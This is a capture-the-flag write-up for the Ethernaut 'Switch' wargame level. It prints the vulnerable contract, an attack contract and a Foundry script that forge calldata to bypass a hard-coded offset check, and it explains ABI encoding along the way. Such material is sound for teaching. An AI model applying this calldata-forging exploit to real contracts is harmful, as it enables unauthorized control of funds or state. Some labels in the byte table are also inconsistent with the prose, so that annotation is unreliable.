# Ethernaut Level 29 Switch

---

Contracts:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Switch {
    bool public switchOn; // switch is off
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));

    modifier onlyThis() {
        require(msg.sender == address(this), "Only the contract can call this");
        _;
    }

    modifier onlyOff() {
        // we use a complex data type to put in memory
        bytes32[1] memory selector;
        // check that the calldata at position 68 (location of _data)
        assembly {
            calldatacopy(selector, 68, 4) // grab function selector from calldata
        }
        require(selector[0] == offSelector, "Can only call the turnOffSwitch function");
        _;
    }

    function flipSwitch(bytes memory _data) public onlyOff {
        (bool success,) = address(this).call(_data);
        require(success, "call failed :(");
    }

    function turnSwitchOn() public onlyThis {
        switchOn = true;
    }

    function turnSwitchOff() public onlyThis {
        switchOn = false;
    }
}
```

We have to turn the switch on to pass the game. It seems impossible since `turnSwitchOn()` can only be called from this very contract and `flipSwitch(bytes memory _data)` can only be called when the input calldata has `turnSwitchOff()` selector. However, we can forge a calldata so that we can trick through `onlyOff` modifier and still call `turnSwitchOn()` under the hood. 

`SwitchAttack.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Switch} from "./Switch.sol";

contract SwitchAttack {
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));
    bytes4 public onSelector = bytes4(keccak256("turnSwitchOn()"));
    bytes4 public flipSelector = bytes4(keccak256("flipSwitch(bytes)"));
    address switchTarget;

    constructor(address switchAddress) {
        switchTarget = switchAddress;
    }

    function attack() public {
        bytes memory inner = abi.encode(
            uint256(0x60),      // offset to data (96 = 0x60)
            uint256(4),         // length of first call data
            offSelector,       // selector for turnSwitchOff()
            uint256(4),         // length of second call data
            onSelector               // selector for turnSwitchOn()
        );

        bytes memory fullCalldata = abi.encodePacked(
            flipSelector,                 // 4 bytes selector
            inner                        // inner
        );

        (bool success, ) = switchTarget.call(fullCalldata);
        require(success, "Attack failed");
    }
}
```

We can see how to create a calldata like this in the `attack()` function. We can visualize `fullCalldata` :

```
0x30c13ade
0000000000000000000000000000000000000000000000000000000000000060
0000000000000000000000000000000000000000000000000000000000000004
20606e1500000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000004
76227e1200000000000000000000000000000000000000000000000000000000
```

| **Offset (bytes)** | **Length (bytes)** | **Content (hex)** | **Meaning**                                                  |
| ------------------ | ------------------ | ----------------- | ------------------------------------------------------------ |
| 0‒3                | 4                  | 30c13ade          | Function selector for flipSwitch(bytes)                      |
| 4‒35               | 32                 | 000…00060         | Head word: offset to the start of _data tail (0x60 = 96 decimal) |
| 36‒67              | 32                 | 000…00004         | Length (4 bytes) of first inner call data (for turnSwitchOff()) |
| 68‒99              | 32                 | 20606e15 000…0000 | First inner call data: selector of turnSwitchOff() (4 bytes) + padding to 32 bytes |
| 100‒131            | 32                 | 000…00004         | Length (4 bytes) of second inner call data (for turnSwitchOn()) |
| 132‒163            | 32                 | 76227e12 000…0000 | Second inner call data: selector of turnSwitchOn() (4 bytes) + padding to 32 bytes |

According to the ABI Specification for Solidity:

- When a function argument is a dynamic type (e.g., bytes memory, string memory, T[]), the head word encodes a **32-byte word representing the offset (in bytes)** from the start of the arguments block to where that argument’s **tail** (actual data) begins. 
- The tail then begins with a 32-byte word for the *length* of the data, followed by the data itself (padded to a multiple of 32 bytes). 
- The offset enables decoders to skip dynamic length segments and locate the data for each argument correctly, especially when multiple dynamic arguments or nested structures are involved.

Why 0x60?

1. First 4 bytes: function selector for flipSwitch(bytes).
2. Then the head section for the arguments: because there is one argument (_data, dynamic), the head section has just **one** 32-byte word: the offset to where the tail begins.
   - If the tail begins immediately after the head (no extra padding/dummy words), the offset value is 0x20 (32) because the head section is 32 bytes long and starts right after the selector. So the tail would begin at byte (4 + 32) = *36 decimal* (0x24 hex).
   - However, if you **insert extra dummy words / padding** so that you align a specific sub-element at a particular byte offset (e.g., you want the first inner selector to appear at byte offset 68 decimal), then you increase the offset accordingly.
     - Example: you insert one extra 32-byte dummy word before the tail → head size becomes 64 bytes → offset becomes 0x40 (64) → tail begins at byte 4 + 64 = byte 68 decimal.
     - If you insert **two** dummy 32-byte words, head size becomes 96 bytes → offset = 0x60 (96) → tail begins at byte 4 + 96 = byte 100 decimal.
3. Then at the tail: length word for _data, then the actual data (which in the exploit is structured as two sub-calls: first length + selector for turnSwitchOff(), then length + selector for turnSwitchOn()), all padded to 32 bytes.

So, it is dangerous to hard code like this: `calldatacopy(selector, 68, 4)` for dynamic data type.

`Switch.s.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {SwitchAttack} from "../src/SwitchAttack.sol";

contract SwitchScript is Script {
    address switchAddress = 0xXXXXXXXXXXXX;

    function run() external {
        vm.startBroadcast();

        SwitchAttack attackContract = new SwitchAttack(switchAddress);
        attackContract.attack();

        vm.stopBroadcast();
    }
}
```

